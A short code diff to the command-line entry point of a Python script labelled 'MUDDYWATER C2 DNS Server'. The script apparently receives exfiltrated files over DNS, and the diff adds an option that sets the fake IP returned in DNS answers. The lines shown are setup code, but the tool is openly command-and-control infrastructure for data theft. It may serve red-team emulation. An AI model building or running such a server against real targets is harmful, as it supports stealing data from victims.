@@ -273,13 +273,16 @@ def run_server(bind_ip: str, port: int):
 
 if __name__ == "__main__":
     parser = argparse.ArgumentParser(description="MUDDYWATER C2 DNS Server")
-    parser.add_argument("--ip",   default="0.0.0.0",      help="IP to bind (default: 0.0.0.0)")
-    parser.add_argument("--port", default=53, type=int,    help="UDP port (default: 53)")
-    parser.add_argument("--out",  default="./received",    help="Output dir for exfil files")
+    parser.add_argument("--ip",      default="0.0.0.0",      help="IP to bind (default: 0.0.0.0)")
+    parser.add_argument("--port",    default=53, type=int,    help="UDP port (default: 53)")
+    parser.add_argument("--out",     default="./received",    help="Output dir for exfil files")
+    parser.add_argument("--fake-ip", default=None,            help="IP returned in DNS A responses (default: same as --ip)")
     args = parser.parse_args()
 
     OUT_DIR  = args.out
     LOG_FILE = os.path.join(os.path.dirname(args.out) or ".", "c2_server.log")
+    if args.fake_ip:
+        FAKE_IP = args.fake_ip
 
     os.makedirs(OUT_DIR, exist_ok=True)
     run_server(args.ip, args.port)
